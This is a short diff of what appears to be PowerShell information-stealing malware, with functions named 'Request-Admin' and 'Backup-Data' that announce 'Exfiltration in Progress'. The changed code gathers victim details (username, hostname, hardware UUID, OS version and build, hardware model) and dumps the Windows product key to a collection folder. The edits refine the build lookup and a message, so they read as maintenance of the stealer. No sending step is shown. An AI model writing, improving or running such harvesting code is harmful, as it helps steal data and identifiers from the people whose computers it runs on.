@@ -123,7 +123,7 @@ function Request-Admin {
 
 function Backup-Data {
     
-    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
+	Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
@@ -175,7 +175,10 @@ function Backup-Data {
     $lang = (Get-WinUserLanguageList).LocalizedName
     $date = Get-Date -Format "r"
     $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
-    $osbuild = (Get-ItemProperty -Path "C:\Windows\System32\hal.dll").VersionInfo.FileVersion
+    $osVersionInfo = Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    $osCurrentBuild = $osVersionInfo.GetValue("CurrentBuild")
+    $osUbr = $osVersionInfo.GetValue("UBR")
+    $osbuild = $osCurrentBuild + "." + $osUbr
     $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
     $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
     $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
@@ -297,7 +300,7 @@ function Backup-Data {
             return $backupProductKey
         }
         catch {
-            return "[!] No product key found" -ForegroundColor Red
+            return "No product key found"
         }
     }
     Get-ProductKey > $folder_general\productkey.txt
